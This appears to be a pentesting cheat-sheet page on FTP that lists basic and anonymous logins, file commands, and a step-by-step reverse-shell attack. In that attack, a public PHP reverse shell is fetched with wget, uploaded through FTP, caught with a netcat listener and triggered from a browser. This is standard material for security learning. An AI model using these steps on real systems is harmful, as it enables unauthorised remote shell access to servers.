---
title: FTP
desc: Connect to FTP server.
tags: [FTP, Linux]
alts: []
website:
render_with_liquid: false
---

## Basic Usage

```sh
ftp username@10.0.0.1

# Anonymous login
ftp 10.0.0.1 
username: anonymous
password: anonymous
```

<br />

## Commands in FTP

```sh
# List files in current directory
ftp> ls

# Transfer files to the local machine.
ftp> get sample.txt
```

<br />

## Upload Reverse Shell Exploit

If the target website (usually port: 80) allows users to access the ftp directory, you can upload the exploit for the reverse shell and get shell.

```sh
# Get the payload for Reverse Shell from the website
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

# Edit "ip" and "port" in the file.

# ----------------------------------------

# Upload the payload
ftp> put php-reverse-shell.php

# -------------------------------------------

# Open the listening port on the attack machine
nc -lvnp 1234

# ---------------------------------------------

In browser, access to the http://vulnerable.com/path/to/ftp/php-reverse-shell.php
```